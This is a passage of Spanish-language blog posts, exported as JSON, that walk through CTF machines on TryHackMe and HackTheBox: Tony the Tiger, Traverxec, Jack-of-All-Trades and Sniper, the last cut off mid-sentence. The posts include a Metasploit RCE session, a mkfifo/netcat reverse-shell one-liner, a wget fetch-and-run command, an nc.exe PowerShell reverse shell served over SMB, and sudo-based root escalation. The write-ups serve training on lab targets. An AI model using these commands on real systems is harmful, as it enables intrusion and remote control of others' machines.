the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port1099-TCP:V=7.80%I=7%D=4/17%Time=5E9A4F92%P=x86_64-pc-linux-gnu%r(NU ... [ snip ] ... Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Apr 17 19:54:24 2020 -- 1 IP address (1 host up) scanned in 73.17 seconds   HTTP Encontramos una pagina corriendo en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  root@upset:~/thm/tonythetiger# gobuster dir -u http://10.10.91.15 -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt /404.html (Status: 200) /categories (Status: 301) /css (Status: 301) /fonts (Status: 301) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /js (Status: 301) /page (Status: 301) /posts (Status: 301) /server-status (Status: 403) /sitemap.xml (Status: 200) /tags (Status: 301)   En la pagina encontramos una imagen, la descargamos y utilizamos strings para buscar nuestra flag.\nHTTP 8080 Encontramos una pagina corriendo en el puerto 8080.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10  root@upset:~/thm/tonythetiger# gobuster dir -u http://10.10.91.15:8080 -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt,jsp /css (Status: 302) /favicon.ico (Status: 200) /images (Status: 302) /index.html (Status: 200) /index.html (Status: 200) /jbossws (Status: 302) /jmx-console (Status: 302) /manager (Status: 302) /WEB-INF (Status: 302)   JBoss - JexBoss Tool Como pudimos ver en la pagina en el puerto 8080 esta corriendo JBoss, y vemos la version en /jbossws/.\nUtilizamos Jexboss para verificar si la maquina es vulnerable y automatizar un ataque. Nos muestra que tiene varias vulnerabilidades.\nMientras nuestra herramienta verifica las vulnerabilidades, tambien nos da la opcion de explotar la maquina, en este caso utilizamos JMXInvokerServlet para obtener una shell inversa, ingresando nuestra IP y el puerto que tenemos a la escucha con Netcat.\nNetcat\nUSER - CMNATIC Logramos obtener una shell inversa con el usuario cmnatic y nuestra flag user.txt en la carpeta principal de jboss.\nUSER - JBOSS En la carpeta de este usuario encontramos una nota en la que contiene una contraseña, al utilizarla en el servicio de SSH logramos obtener una shell.\nSSH\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando find. Utilizamos find para obtener una shell root.\nFind\nLogramos obtener una shell root, econtramos nuestra ultima flag root.txt pero al parecer esta codificada.\nAl decodificar nuestra flag nos devuelve un hash, utilizamos crackstation para obtener el texto.\nCrackstation\n","description":"Tony the Tiger es una maquina de TryHackMe, explotamos una vulnerabilidad en JBoss con JexBoss Tool para acceder a la maquina. Accedimos con un segundo usuario utilizando contraseñas almacenadas. Finalmente escalamos privilegios utilizando Find e informacion de GTFOBins.","id":92,"section":"posts","tags":["JexBoss"],"title":"TryHackMe - Tony the Tiger","uri":"https://sckull.github.io/posts/tonythetiger/"},{"content":"  Traverxec es una maquina de HackTheBox. Nos topamos con Nostromo y una vulnerabilidad que explotamos con Metasploit. Accedimos con un segundo por SSH tras enumerar y crackear un archivo comprimido que contenia una clave privada. Escalamos privilegios utilizando JournalCtl.\nInformacion de la Maquina    Nombre Traverxec      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.165   Maker jkr    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[6.4, 5.4, 7.2, 2.8, 4.6], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[3, 5, 7, 3, 5], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp, nmap y masscan nos muestran el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  root@aoiri:~/htb/traverxec# masscan -p1-65535,U:1-65535 10.10.10.165 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-30 05:12:44 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.165 Discovered open port 80/tcp on 10.10.10.165 # Nmap 7.80 scan initiated Sun Dec 29 23:09:53 2019 as: nmap -p- --min-rate 1000 -o nmap_scan 10.10.10.165 Nmap scan report for 10.10.10.165 Host is up (0.28s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Sun Dec 29 23:12:05 2019 -- 1 IP address (1 host up) scanned in 132.10 seconds # Nmap 7.80 scan initiated Sun Dec 29 23:12:40 2019 as: nmap -sV -sC -p22,80 -o nmap_scan_pr 10.10.10.165 Nmap scan report for 10.10.10.165 Host is up (0.080s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA) | 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA) |_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-title: TRAVERXEC Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Dec 29 23:13:00 2019 -- 1 IP address (1 host up) scanned in 19.96 seconds   HTTP - Puerto 80 Nos muestra una pagina web de una persona.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos que nos pudiesen servir.\n1 2 3 4 5 6 7 8 9 10  root@aoiri:~/htb/traverxec# gobuster dir -u http://10.10.10.165/ -w /usr/share/wordlists/dirb/common.txt -x html,txt,php -t 15 -q /css (Status: 301) /empty.html (Status: 200) /icons (Status: 301) /img (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /js (Status: 301) /lib (Status: 301) /Readme.txt (Status: 200)   WHATWEB Utilizamos esta herramienta para concoer que tipo de webserver esta corriendo en el puerto 80.\nNOSTROMO - RCE Buscamos si existe una vulnerabilidad para este webserver encontramose una y es del tipo RCE (cve-2019-16278). Utilizamos metasploit para configurarlo, obtenemos una shell con el usuario www-data.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70  msf5 \u0026gt; use exploit/multi/http/nostromo_code_exec msf5 exploit(multi/http/nostromo_code_exec) \u0026gt; show options Module options (exploit/multi/http/nostromo_code_exec): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 80 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic (Unix In-Memory) msf5 exploit(multi/http/nostromo_code_exec) \u0026gt; set rhosts 10.10.10.165 rhosts =\u0026gt; 10.10.10.165 msf5 exploit(multi/http/nostromo_code_exec) \u0026gt; set lhost tun0 lhost =\u0026gt; 10.10.14.67 msf5 exploit(multi/http/nostromo_code_exec) \u0026gt; show options Module options (exploit/multi/http/nostromo_code_exec): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.165 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 80 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.67 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic (Unix In-Memory) msf5 exploit(multi/http/nostromo_code_exec) \u0026gt; run   USER - David Realizamos una enumeracion de los directorios en la maquina encontramos un archivo (.httpasswd) en el directorio de nostromo que contiene una contraseña encriptada en md5crypt.\nDesencriptamos la contraseña con john pero al intentar utilizarla en ssh no funcionó.\nJohn:\nSSH:\nEn el mismo directorio encontramos un archivo de configuracion de nostromo en el que esta definido ciertos parametros para el webserver.\nnhttpd.conf\nSegun la documentacion, los parametros definidos con homedirs son las carpetas de usuarios que pueden ser accedidos a traves de HTTP utilizando ~nombreUsuario en la url.\n1 2 3 4  # HOMEDIRS [OPTIONAL] homedirs\t/home homedirs_public\tpublic_www   En el caso de nuestra maquina podemos acceder a la carpeta del usuario david con ~david.\nComo podemos observar podemos acceder a la carpeta del usuario david, más no por medio de una shell ya que no tenemos los permisos suficientes, de igual forma existe otro parametro homedirs_public esta carpeta definida esta dentro de la carpeta de homedirs definida anteriormente, por lo que podemos acceder a esta desde nuestro navegador y desde nuestra shell.\nVemos que hay un backup de ssh, accedemos desde nuestro navegador a la carpeta /~david/protected-file-area/, nos pedira una contraseña y un usuario, utilizamos las credenciales crackeadas anteriormente y podemos ver y descargar el archivo.\nUtilizamos la clave privada para iniciar sesion, pero esta, esta protegida encriptada, utilizamos ssh2john para obtener el hash y crackear la frase, luego de esto usamos la frase con el usuario david y la llave privada atraves de ssh y obtenemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Dentro de la carpeta de David encontramos un archivo bash que ejecuta ciertos binarios o comandos del sistema, pero vemos que journalctl es ejecutado junto a sudo y cat. Intentamos enumerar los ficheros que pueden ser ejecutados junto a sudo con el usuario David pero no tenemosla contraseña de este.\n1  /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat   Para obtener una shell, ejecutamos sudo con journalctl tal y como se ejecuta en el archivo bash, luego de eso escribimos !/bin/sh y obtenemos shell con usuario root y nuestra flag root.txt.\nSegun Gtfobins al ejecutar journalctl, este, ejecuta lo que parece ser less, por lo que pudimos abrir una shell con el comando !/bin/sh.\n","description":"Traverxec es una maquina de HackTheBox. Nos topamos con Nostromo y una vulnerabilidad que explotamos con Metasploit. Accedimos con un segundo por SSH tras enumerar y crackear un archivo comprimido que contenia una clave privada. Escalamos privilegios utilizando JournalCtl.","id":93,"section":"posts","tags":["nostromo","metasploit"],"title":"Hack The Box - Traverxec","uri":"https://sckull.github.io/posts/traverxec/"},{"content":"  Jack-of-All-Trades es una maquina de TryHackMe, SSH está presente en un puerto diferente y en el puerto 22 vemos una pagina web con algunos retos CTF Like que nos dieron acceso al usuario Jack y, con la ejecucion de un binario con permisos SUID obtuvimos la flag root.\nRoom    Titulo Jack-of-All-Trades      Descripción Boot-to-root originally designed for Securi-Tay 2020   Puntos 60   Dificultad Facil   Maker MuirlandOracle     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (80) y el puerto http (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  # Nmap 7.80 scan initiated Wed Apr 8 17:56:03 2020 as: nmap -sV -sC -o nmap_scan 10.10.111.123 Nmap scan report for 10.10.111.123 Host is up (0.20s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Jack-of-all-trades! |_ssh-hostkey: ERROR: Script execution failed (use -d to debug) 80/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA) | 2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA) | 256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA) |_ 256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Apr 8 17:57:19 2020 -- 1 IP address (1 host up) scanned in 76.06 seconds     HTTP Al visitar el puerto 80 nos muestra un error nuestro navegador.\nLa IP esta activa, solo el puerto en el que esta corriendo Apache es el 22 y no el 80, se puede configurar el puerto en firefox dentro de about:config creando un string de configuracion.\nAhora si podemos visitar la pagina y nos muestra lo siguiente.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  root@upset:~/thm/jack-of-All-Trades# gobuster dir -u http://10.10.111.123:22/ -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt -q /.htpasswd (Status: 403) /.htpasswd.html (Status: 403) /.htpasswd.txt (Status: 403) /.htpasswd.php (Status: 403) /.hta (Status: 403) /.hta.txt (Status: 403) /.hta.php (Status: 403) /.hta.html (Status: 403) /assets (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /recovery.php (Status: 200) /server-status (Status: 403) root@upset:~/thm/jack-of-All-Trades#   En el index de la pagina encontramos varias cosas interesantes en el codigo fuente.\nVemos un comentario que al decodificarlo en base64 nos muestra un mensaje.\nNos dirigimos a /recovery.php e intentamos utilizar la contraseña con Johny Grave y combinacion del nombre pero no nos deja ingresar.\nVemos en el codigo fuente una string codificada.\nGQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ= Utilizamos base32 y hex para decodificar la cadena, lo cual nos devuelve una nueva cadena cifrada, esta vez al parecer es Caesar Cipher.\ndcode.fr tiene una herramienta muy util que nos ayudó a decifrar el mensaje, CAesar Cipher.\nEl link que nos menciona el mensaje nos redirige a una pagina de wikipedia con el nombre de Stegosauria, si recordamos en el index hay una imagen con un nombre parecido. Intentamos con steganografia en la imagen utilizando steghide.\nObtenemos un archivo que nos indica que vamos por buen camino pero la imagen no es la correcta. Hacemos lo mismo con las otras dos imagenes del index, y obtuvimos un archivo con credenciales en la imagen header.jpg.\nIngresamos al panel de /recovery.php y vemos un mensaje.\nLe pasamos un comando al parametro cmd y logramos ejecutar el comando.\nAhora que podemos ejecutar comandos, utilizamos esta ventaja para obtener una shell inversa, primero creamos un archivo el que contenga nuestro comando para nuestra shell.\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 1338 \u0026gt;/tmp/f Creamos un pequeño servidor http con python3 python3 -m http.server 80. Ejecutamos el siguiente comando para obtener nuestra shell.\nbash -c \u0026quot;$(wget -qO- 10.8.1.72/shell.sh)\u0026quot; Y ponemos a la escucha netcat en nuestra maquina rlwrap nc -lvp 1338 y obtenemos nuestra shell.\nUSER - JACK Dentro del directorio /home encontramos una lista de posibles contraseñas que parecen ser del usuario jack.\nUtilizamos hydra con la lista de posibles contraseñas en el servicio SSH utilizando el puerto 80, logramos encontrar la contraseña.\nUtilizamos ssh y obtenemos una shell.\nVemos una imagen, la pasamos a nuestra maquina con netcat, abrimos la imagen y vemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Enumeramos los binarios que puedan ayudar a obtener una shell con privilegios root, encontramos strings con el cual podemos leer archivos.\nUtilizamos strings para obtener nuestra flag /root/root.txt.\n","description":"Jack-of-All-Trades es una maquina de TryHackMe, SSH está presente en un puerto diferente y en el puerto 22 vemos una pagina web con algunos retos CTF Like que nos dieron acceso al usuario Jack y, con la ejecucion de un binario con permisos SUID obtuvimos la flag root.","id":94,"section":"posts","tags":["caesar","steganography","steghide","suid","hydra"],"title":"TryHackMe - Jack-of-All-Trades","uri":"https://sckull.github.io/posts/jackofalltrades/"},{"content":"  Descubrimos una vulnerabilidad LFI/RFI en el blog donde ejecutamos una shell inversa utilizando una WebShell. Cambiamos al siguiente usuario utilizando PowerShell y credenciales almacenadas. Creando un archivo CHM y tras ser ejecutado escalamos privilegios.\nInformacion de la Maquina    Nombre Sniper      OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.151   Maker MinatoTWfelamos    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[7.5, 7.8, 5.4, 4.6, 2.2], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[8, 9, 2, 8, 1], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-15 18:34:38 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.151 Discovered open port 135/tcp on 10.10.10.151 Discovered open port 49667/tcp on 10.10.10.151 Discovered open port 139/tcp on 10.10.10.151 # Nmap 7.80 scan initiated Wed Jan 15 12:30:50 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.151 Nmap scan report for 10.10.10.151 Host is up (0.24s latency). Not shown: 65530 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Sniper Co. 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 49667/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 8h01m11s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-01-16T02:36:27 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jan 15 12:35:53 2020 -- 1 IP address (1 host up) scanned in 303.66 seconds   HTTP En el puerto 80 corriendo IIS con una pagina web.\nGOBUSTER Escaneo de directorios y archivos con gobuster.\n1 2 3 4 5 6 7 8 9 10 11  root@aoiri:~/htb/sniper# gobuster dir -u http://10.10.10.151/ -w /usr/share/wordlists/dirb/common.txt -t 15 -x asp,aspx,php,html,txt -q /Blog (Status: 301) /blog (Status: 301) /css (Status: 301) /images (Status: 301) /Images (Status: 301) /index.php (Status: 200) /Index.php (Status: 200) /index.php (Status: 200) /js (Status: 301) /user (Status: 301)   /blog/ 1 2 3 4 5 6 7 8  root@aoiri:~/htb/sniper# gobuster dir -u http://10.10.10.151/blog/ -w /usr/share/wordlists/dirb/common.txt -t 15 -x asp,aspx,php,html,txt -q /css (Status: 301) /error.html (Status: 200) /header.html (Status: 200) /Index.php (Status: 200) /index.php (Status: 200) /index.php (Status: 200) /js (Status: 301   /user/ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  root@aoiri:~/htb/sniper# gobuster dir -u http://10.10.10.151/user/ -w /usr/share/wordlists/dirb/common.txt -t 15 -x asp,aspx,php,html,txt -q /auth.php (Status: 302) /css (Status: 301) /db.php (Status: 200) /DB.php (Status: 200) /fonts (Status: 301) /Images (Status: 301) /images (Status: 301) /index.php (Status: 302) /Index.php (Status: 302) /index.php (Status: 302) /js (Status: 301) /login.php (Status: 200) /Login.php (Status: 200) /logout.php (Status: 302) /registration.php (Status: 200) /vendor (Status: 301)   Encontramos dos rutas distintas donde estan almacenadas dos paginas diferentes, una donde se muestra un panel de inicio de sesion y la otra nos muestra una pagina con algunos articulos.\n/user/ /blog/ LFI-RFI -\u0026gt; Shell IUSR En la pagina de /blog/ encontramos que, al cambiar de idioma se le pasa como parametro un archivo existente a lang, a la pagina.\nAl realizar una consulta/archivo que no exista en la maquina nos muestra un mensaje de error, esto quiere decir que debe de existir el archivo en la maquina.\nIntentamos todos los payloads que pudiesen afectar a esta vulnerabilidad pero ninguno funciono, por lo que para explotar esta vulnerabilidad utilizamos un servidor SAMBA para pasarle como parametro una webshell desde nuestra maquina.\nConfiguracion de Servidor SAMBA:\n1 2 3 4 5  apt-get install samba mkdir /var/www/html/pub/ chmod 0555 /var/www/html/pub/ chown -R nobody:nogroup /var/www/html/pub/ touch \u0026gt; /etc/samba/smb.conf   /etc/samba/smb.conf:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  [global] workgroup = WORKGROUP server string = Samba Server %v netbios name = indishell-lab security = user map to guest = bad user name resolve order = bcast host dns proxy = no bind interfaces only = yes [test] path = /var/www/html/pub writable = yes guest ok = yes guest only = yes read only = yes directory mode = 0555 force user = nobody   service smbd restart Acceder a:\n\\\\10.10.10.10\\test\\ La webshell que utilizamos es WhiteWinterWolf - Webshell. Una vez terminado nuestra configuracion le pasamos a la pagina nuestra IP junto con el SHARENAME y la webshell, y logramos ejecuar comandos con el usuario IUSR.\nAhora que podemos ejecutar comandos vamos a obtener una shell inversa utilizando netcat (nc.exe) en la misma carpeta donde colocamos nuestra webshell. Utilizamos el siguiente comando:\n1  \\\\10.10.15.244\\test\\nc.exe -e C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 10.10.15.244 443   Obtenemos una shell con el usuario IUSR.\nUSER - Chris Enumeramos los archivos que se encuentran en ambas paginas (blog, user) y encontramos en user un archivo de php en el que se encuentran las credenciales para la base de datos.\nCredenciales:\n1 2  Host, User, Password, DB \u0026#34;localhost\u0026#34;,\u0026#34;dbuser\u0026#34;,\u0026#34;36mEAhz/B8xQ~2VM\u0026#34;,\u0026#34;sniper\u0026#34;   Dentro de las carpetas de Usuarios (C:\\Users) encontramos a Chris como uno de los usuarios, utilizamos la contraseña de la base de datos con el usuario Chris para verificar que tenga permisos de escritura en la maquina atraves de samba con smbmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  [+] Finding open SMB ports.... [+] User SMB session established on 10.10.10.151... [+] IP: 10.10.10.151:445\tName: 10.10.10.151 Disk Permissions\tComment ---- -----------\t------- ADMIN$ NO ACCESS\tRemote Admin C$ NO ACCESS\tDefault share . fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tInitShutdown fr--r--r-- 4 Sun Dec 31 17:57:56 1600\tlsass fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tntsvcs fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tscerpc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-368-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tepmapper fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-1e4-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tLSM_API_service fr--r--r-- 3 Sun Dec 31 17:57:56 1600\teventlog fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-408-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tatsvc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-598-0 fr--r--r-- 4 Sun Dec 31 17:57:56 1600\twkssvc fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tspoolss fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-a2c-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\ttrkwks fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tW32TIME_ALT fr--r--r-- 4 Sun Dec 31 17:57:56 1600\tsrvsvc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tvgauth-service fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-270-0 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-284-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tROUTER fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132236907993416575.1908.DefaultAppDomain.powershell fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tiisipmbed63cd4-5a7a-4011-8a3f-7ca5d2834ac3 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tiislogpipe3e6fd272-542c-4985-87e5-bd930a7401e4 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132237251159401733.1252.DefaultAppDomain.powershell fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132237268742138566.1496.DefaultAppDomain.wsmprovhost fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tIISFCGI-3e6bfe08-4ed8-4e32-97ff-7c49438ccb63 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tIISFCGI-0587ff21-c423-47bb-872e-34f067d827a9 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132237302290243128.4168.DefaultAppDomain.powershell fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132237304828945308.4400.DefaultAppDomain.powershell fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132237305109360308.5580.DefaultAppDomain.wsmprovhost IPC$ READ ONLY\tRemote IPC   Vemos que Chris tiene permisos de escritura y lectura en (.) la maquina. Intentamos utilizar smbclient y los modulos de metasploit para samba pero ninguno de ellos sirvio para obtener una shell. Por lo que utilizamos la misma tecnica que utilizamos con la maquina Arkham de HackTheBox en la que 